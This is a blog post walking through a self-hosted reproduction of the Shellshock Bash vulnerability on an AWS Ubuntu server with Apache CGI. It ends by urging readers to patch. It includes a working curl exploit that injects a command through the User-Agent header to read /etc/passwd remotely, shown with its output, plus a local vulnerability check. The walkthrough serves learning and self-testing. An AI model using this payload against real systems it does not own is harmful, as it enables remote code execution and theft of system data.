---
layout: post
title: Shellshock DIY
tags: aws apache bash
username: akenn
crosspost: https://akenn.org/blog/shellshock/
---

When [news of Shellshock first broke](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271), the main vector of attack was any application running on an Apache server via CGI. I don't run any Apache servers anymore, and if I did I probably wouldn't be running them with CGI (just not my preference). However, I wanted to try this bug out and I didn't want to do so in a malicious manner; I simply wanted to see what it did.

Without further ado, let's hack ourselves!

First we'll go create an EC2 instance on AWS. My preference is to use Ubuntu because I know it best and I'm able to find solutions to issues I encounter very quickly.

After our instance is up and running we'll SSH into it and check if the default version of Bash is vulnerable.

{% highlight bash %}
$ ssh -l ubuntu [Your IP address] -i ~/.ssh/shellshock.pem
$ env X="() { :;} ; echo busted" /bin/bash -c "echo completed"
busted
completed
{% endhighlight %}

Oh heck yeah, it totally is.

(**Note:** I'm using an old AWS image I made a few months ago. I believe Amazon patched bash on all their default images. If Bash is already patched on your machine, my next suggestion is to find a Vagrant image that isn't patched yet. If you can't, leave a comment below. I can post a tutorial on how to compile an old, vulnerable version of Bash and replace the patched one on your box; for science!) 

Ok next step: Installing Apache and configuring it to use CGI.

{% highlight bash %}
sudo apt-get install apache2
sudo a2enmod cgi
{% endhighlight %}

That was easy. We need to tell Apache when to use CGI. We'll do that by adding the following somewhere in the config of a site in our enabled virtual hosts folder (`/etc/apache2/sites-enabled`; in our case the exact file is `/etc/apache2/sites-enabled/000-default.conf`):

{% highlight apache %}
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
<Directory "/usr/lib/cgi-bin">
  AllowOverride None
  Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
  Order allow,deny
  Allow from all
</Directory>
{% endhighlight %}

The complete Apache configuration file for the virtual host we'll be using looks like this:

{% highlight apache %}
<VirtualHost *:80>
  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
  <Directory "/usr/lib/cgi-bin">
    AllowOverride None
    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
    Order allow,deny
    Allow from all
  </Directory>

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
{% endhighlight %}

Add a file called `poc.cgi` to `/usr/lib/cgi-bin` with the following contents:

{% highlight bash %}
#!/bin/bash

echo "Content-type: text/html"
echo ""

echo '<html>'
echo '<head>'
echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'
echo '<title>PoC</title>'
echo '</head>'
echo '<body>'
echo '<pre>'
/usr/bin/env
echo '</pre>'
echo '</body>'
echo '</html>'

exit 0
{% endhighlight %}

**Note:** The contents of this file can be anything, as can the filename. In our case the file just needs to exist. I chose to copy the Bash script above from [https://www.invisiblethreat.ca/2014/09/cve-2014-6271/](https://www.invisiblethreat.ca/2014/09/cve-2014-6271/) because it's an easy way to check that apache is configured correctly.

**Additional Note:** You may need to change the permissions of this file and directory. If you get a 403 error, try `sudo chmod 755 -R /usr/lib/cgi-bin`.

Now let's restart Apache.

{% highlight bash %}
sudo services apache2 restart
{% endhighlight %}

If everything went according to plan, we should be able to run this script via CGI and have the result returned to us. Let's see if that works:

{% highlight bash %}
~
❯ curl http://[Your IP Address]/cgi-bin/poc.cgi
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>PoC</title>
</head>
<body>
<pre>
SERVER_SIGNATURE=<address>Apache/2.4.7 (Ubuntu) Server at [Your IP Address] Port 80</address>

HTTP_USER_AGENT=curl/7.30.0
SERVER_PORT=80
HTTP_HOST=[Your IP Address]
DOCUMENT_ROOT=/var/www/html
SCRIPT_FILENAME=/usr/lib/cgi-bin/poc.cgi
REQUEST_URI=/cgi-bin/poc.cgi
SCRIPT_NAME=/cgi-bin/poc.cgi
REMOTE_PORT=34236
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
CONTEXT_PREFIX=/cgi-bin/
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
REQUEST_SCHEME=http
HTTP_ACCEPT=*/*
REMOTE_ADDR=[Remote IP Address]
SHLVL=1
SERVER_NAME=
SERVER_SOFTWARE=Apache/2.4.7 (Ubuntu)
QUERY_STRING=
SERVER_ADDR=10.0.0.153
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
_=/usr/bin/env
</pre>
</body>
</html>
{% endhighlight %}

Awesome! Now that everything is set up, let's exploit ourselves.

{% highlight bash %}
~
❯ curl -A "() { foo;};echo;/bin/cat /etc/passwd" http://[Your Server IP]/cgi-bin/poc.cgi
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/zsh

{% endhighlight %}

Great success! We were successfully able to run an arbitrary code execution exploit on a remote machine (that we own).

Now go patch Bash!

Resources and helpful links:

- [How to Protect your Server Against the Shellshock Bash Vulnerability](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability)
- [Everything you need to know about the Shellshock Bash bug](http://www.troyhunt.com/2014/09/everything-you-need-to-know-about.html)
- [CVE-2014-6271: BASH LETS YOU DO BAD THINGS. (SHELLSHOCK)](https://www.invisiblethreat.ca/2014/09/cve-2014-6271/)
- [How do I secure Apache against the Bash Shellshock vulnerability?](http://security.stackexchange.com/questions/68146/how-do-i-secure-apache-against-the-bash-shellshock-vulnerability)
- [Shellshock DHCP RCE Proof of Concept](https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/)
- [Bash – ShellShocker – Attacks Increase in the Wild – Day 1](http://blog.sucuri.net/2014/09/bash-shellshocker-attacks-increase-in-the-wild-day-1.html)
